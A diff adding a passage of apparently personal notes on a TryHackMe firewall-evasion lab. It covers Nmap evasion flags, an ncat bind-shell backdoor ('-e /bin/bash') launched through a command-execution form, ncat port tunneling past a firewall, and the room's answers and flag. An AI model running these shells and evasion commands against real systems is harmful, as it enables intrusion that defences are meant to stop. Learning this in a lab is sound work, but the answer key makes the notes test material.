@@ -185,3 +185,191 @@ One of the IP header fields is the IP Options field. Nmap lets you control the v
 A shortcut provided by Nmap is using the letters to make your requests:
 R to record-route.
 T to record-timestamp.
+U to record-route and record-timestamp.
+L for loose source routing and needs to be followed by a list of IP addresses separated by space.
+S for strict source routing and needs to be followed by a list of IP addresses separated by space.
+The loose and strict source routing can be helpful if you want to try to make your packets take a particular route to avoid a specific security system.
+Use a Wrong Checksum
+Another trick you can use is to send your packets with an intentionally wrong checksum. Some systems would drop a packet with a bad checksum, while others won’t. You can use this to your advantage to discover more about the systems in your network. All you need to do is add the option --badsum to your Nmap command.
+Using nmap -sS -Pn --badsum -F 10.10.158.65, we scanned our target using intentionally incorrect TCP checksums. The target dropped all our packets and didn’t respond to any of them.
+```text
+Pentester Terminal
+
+           
+pentester@TryHackMe# nmap -sS -Pn --badsum -F 10.10.158.65
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-28 16:07 EET
+Nmap scan report for 10.10.158.65
+Host is up.
+All 100 scanned ports on MACHINE_IP are filtered
+
+Nmap done: 1 IP address (1 host up) scanned in 21.31 seconds
+```
+The screenshot below shows the packets captured by Wireshark on the system running Nmap. Wireshark can be optionally set to verify the checksums, and we can notice how it highlights the errors.
+```text
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap -sS -Pn --badsum -F 10.10.158.65
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-10 22:24 EDT
+Nmap scan report for 10.10.158.65
+Host is up.
+All 100 scanned ports on 10.10.158.65 are in ignored states.
+Not shown: 100 filtered tcp ports (no-response)
+
+Nmap done: 1 IP address (1 host up) scanned in 21.31 seconds
+```
+Scan the attached MS Windows machine using the --badsum option. How many ports appear to be open?
+*0*
+This is a quick summary of the Nmap options discussed in this task.
+Evasion Approach 	Nmap Argument
+Set IP time-to-live field 	--ttl VALUE
+Send packets with specified IP options 	--ip-options OPTIONS
+Send packets with a wrong TCP/UDP checksum 	--badsum
+### Evasion Using Port Hopping
+Three common firewall evasion techniques are:
+Port hopping
+Port tunneling
+Use of non-standard ports
+Port hopping is a technique where an application hops from one port to another till it can establish and maintain a connection. In other words, the application might try different ports till it can successfully establish a connection. Some “legitimate” applications use this technique to evade firewalls. In the following figure, the client kept trying different ports to reach the server till it discovered a destination port not blocked by the firewall.
+There is another type of port hopping where the application establishes the connection on one port and starts transmitting some data; after a while, it establishes a new connection on (i.e., hopping to) a different port and resumes sending more data. The purpose is to make it more difficult for the blue team to detect and track all the exchanged traffic.
+On the AttackBox, you can use the command ncat -lvnp PORT_NUMBER to listen on a certain TCP port.
+-l listens for incoming connections
+-v provides verbose details (optional)
+-n does not resolve hostnames via DNS (optional)
+-p specifies the port number to use
+-lvnp PORT_NUMBER listens on TCP port PORT_NUMBER. If the port number is less than 1024, you need to run ncat as root.
+For example, run ncat -lvnp 1025 on the AttackBox to listen on TCP port 1025, as shown in the terminal output below.
+```text
+Pentester Terminal
+
+           
+pentester@TryHackMe$ ncat -lvnp 1025
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::1025
+Ncat: Listening on 0.0.0.0:1025
+```
+We want to test if the target machine can connect to the AttackBox on TCP port 1025. By browsing to http://10.10.23.152:8080, you will be faced with a web page that lets you execute commands on the target machine. Note that in a real-case scenario, you might be exploiting a vulnerable service that allows remote code execution (RCE) or a misconfigured system to execute some code of your choice.
+In this lab, you can simply run a Linux command by submitting it on the provided form at http://10.10.23.152:8080. We can use Netcat to connect to the target port using the command ncat IP_ADDRSS PORT_NUMBER. For instance, we can run ncat ATTACKBOX_IP 1024 to connect to the AttackBox at TCP port 1024. We want to check if the firewall is configured to allow connections. If the connection from the machine, with IP address 10.10.23.152, can pass through the firewall, we will be notified of the successful connection on the AttackBox terminal as shown below.
+```text
+Pentester Terminal
+
+           
+pentester@TryHackMe$ ncat -lvnp 1025
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::1025
+Ncat: Listening on 0.0.0.0:1025
+Ncat: Connection from 10.10.30.130.
+Ncat: Connection from 10.10.30.130:51292.
+```
+Using this simple technique, discover which port number of the following destination TCP port numbers are reachable from the protected system.
+21
+23
+25
+26
+27
+Only one destination TCP port number should be reachable.
+ncat -lvnp PORT_NUMBER -e /bin/bash will create a backdoor via the specified port number that lets you interact with the Bash shell.
+-e or --exec executes the given command
+/bin/bash location of the command we want to execute
+On the AttackBox, we can run ncat 10.10.23.152 PORT_NUMBER to connect to the target machine and interact with its shell.
+Considering the case that we have a firewall, it is not enough to use ncat to create a backdoor unless we can connect to the listening port number. Moreover, unless we run ncat as a privileged user, root, or using sudo, we cannot use port numbers below 1024.
+![[Pasted image 20220910215752.png]]
+```text
+root@ip-10-10-237-131:~# ncat 10.10.23.152 8081
+whoami
+thmredteam
+```
+We’re continuing to use the web-form from Task 6 to set up the ncat listener. Knowing that the firewall does not block packets to destination port 8081, use ncat to listen for incoming connections and execute Bash shell. Use the AttackBox to connect to the listening shell. What is the user name associated with which you are logged in?
+Run whoami to find the username.
+*thmredteam*
+### Next-Generation Firewalls
+Traditional firewalls, such as packet-filtering firewalls, expect a port number to dictate the protocol being used and identify the application. Consequently, if you want to block an application, you need to block a port. Unfortunately, this is no longer valid as many applications camouflage themselves using ports assigned for other applications. In other words, a port number is no longer enough nor reliable to identify the application being used. Add to this the pervasive use of encryption, for example, via SSL/TLS.
+Next-Generation Firewall (NGFW) is designed to handle the new challenges facing modern enterprises. For instance, some of NGFW capabilities include:
+Integrate a firewall and a real-time Intrusion Prevention System (IPS). It can stop any detected threat in real-time.
+Identify users and their traffic. It can enforce the security policy per-user or per-group basis.
+Identify the applications and protocols regardless of the port number being used.
+Identify the content being transmitted. It can enforce the security policy in case any violating content is detected.
+Ability to decrypt SSL/TLS and SSH traffic. For instance, it restricts evasive techniques built around encryption to transfer malicious files.
+A properly configured and deployed NGFW renders many attacks useless.
+What is the number of the highest OSI layer that an NGFW can process?
+*7*
+### Conclusion
+This room covered the different types of firewalls and the common evasion techniques. Correctly understanding the limitations of the firewall technology you are targeting helps you pick and construct suitable firewall evasion processes. This room demonstrated different evasion techniques using ncat; however, the same results can be achieved using a different tool, such as socat. It is recommended to check out the What the Shell? room.
+The following table summarizes the Nmap arguments covered in this room.
+Evasion Approach 	Nmap Argument
+Hide a scan with decoys 	-D DECOY1_IP1,DECOY_IP2,ME
+Use an HTTP/SOCKS4 proxy to relay connections 	--proxies PROXY_URL
+Spoof source MAC address 	--spoof-mac MAC_ADDRESS
+Spoof source IP address 	-S IP_ADDRESS
+Use a specific source port number 	-g PORT_NUM or --source-port PORT_NUM
+Fragment IP data into 8 bytes 	-f
+Fragment IP data into 16 bytes 	-ff
+Fragment packets with given MTU 	--mtu VALUE
+Specify packet length 	--data-length NUM
+Set IP time-to-live field 	--ttl VALUE
+Send packets with specified IP options 	--ip-options OPTIONS
+Send packets with a wrong TCP/UDP checksum 	--badsum
+Ensure you have gained a solid understanding of the technologies and techniques presented in this room.
+
+## Exploitation
+```text
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 21
+listening on [any] 21 ...
+connect to [10.11.81.220] from (UNKNOWN) [10.10.23.152] 53434
+```
+![[Pasted image 20220910213329.png]]
+*21*
+### Evasion Using Port Tunneling
+Port tunneling is also known as port forwarding and port mapping. In simple terms, this technique forwards the packets sent to one destination port to another destination port. For instance, packets sent to port 80 on one system are forwarded to port 8080 on another system.
+Port Tunneling Using ncat
+Consider the case where you have a server behind the firewall that you cannot access from the outside. However, you discovered that the firewall does not block specific port(s). You can use this knowledge to your advantage by tunneling the traffic via a different port.
+Consider the following case. We have an SMTP server listening on port 25; however, we cannot connect to the SMTP server because the firewall blocks packets from the Internet sent to destination port 25. We discover that packets sent to destination port 443 are not blocked, so we decide to take advantage of this and send our packets to port 443, and after they pass through the firewall, we forward them to port 25. Let’s say that we can run a command of our choice on one of the systems behind the firewall. We can use that system to forward our packets to the SMTP server using the following command.
+ncat -lvnp 443 -c "ncat TARGET_SERVER 25"
+The command ncat uses the following options:
+-lvnp 443 listens on TCP port 443. Because the port number is less than 1024, you need to run ncat as root in this case.
+-c or --sh-exec executes the given command via /bin/sh.
+"ncat TARGET_SERVER 25" will connect to the target server at port 25.
+As a result, ncat will listen on port 443, but it will forward all packets to port 25 on the target server. Because in this case, the firewall is blocking port 25 and allowing port 443, port tunneling is an efficient way to evade the firewall.
+We have a web server listening on the HTTP port, 80. The firewall is blocking traffic to port 80 from the untrusted network; however, we have discovered that traffic to TCP port 8008 is not blocked. We’re continuing to use the web-form from Task 6 to set up the ncat listener that forwards the packets received to the forwarded port. Using port tunneling, browse to the web server and retrieve the flag.
+Revisit the command ncat -lvnp 443 -c "ncat TARGET_SERVER 25" and update with the suitable port numbers. Note that TARGET_SERVER should be replaced with localhost.
+Let's set up a port forwarding from port 80 to 8008 on the webserver from the vulnerable form hosted on port 8080 :
+ncat -lvnp 8008 -c "ncat localhost 80"
+Then try to connect netcat to the server with the non-filtered port in the firewall 8008 and request the website with a GET / HTTP request :
+```text
+root@ip-10-10-15-106:~# nc 10.10.99.203 8008
+GET /
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Welcome to Our Local Server</title>
+</head>
+<body>
+        THM{1298331956}
+</body>
+</html>
+```
+![](https://www.cyb3rm3.com/web/image/1299-33cb6d2e/2022-02-26%2015_09_37-TryHackMe%20_%20Firewalls.png)
+
+## Flags / Answers
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/09d8061f603e6ba8e65a185dc4a2d417.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/756fac51ff45cbc4af49336b15a30928.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/33fce30a440219d606f89908c10c9f8b.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/84b1b779099b68c50c5685bc224a38db.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/169fd944d79366e156fcb6c30ff8018e.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/0123f32d7cc90fca50a3d565824955b1.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/2fb8362a71b22cdbe9e60fd638c1813c.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/a0307f9e74e7f110b546dc7b423a288e.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/4b9961c8f49af3eded45b0b43c03548b.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/fc0fd2f0fed576aed08e9750acff314b.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/7ec48d889b3ba89910d69526ddbe4fd2.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/c71dd8a63e95fac1ad5a2aa68220c780.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/f98efaf6faf449bf6cc2787baa581e31.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/c7817144af9ef754d778fc4efb0f9a36.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/26fce8aa8569f391ad64a26a147de2d4.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/ef6b903dbb6c4eb20051f9ddd5b9fa8f.png)
+
+## Notes / Lessons Learned
+[[Enumeration]]
+
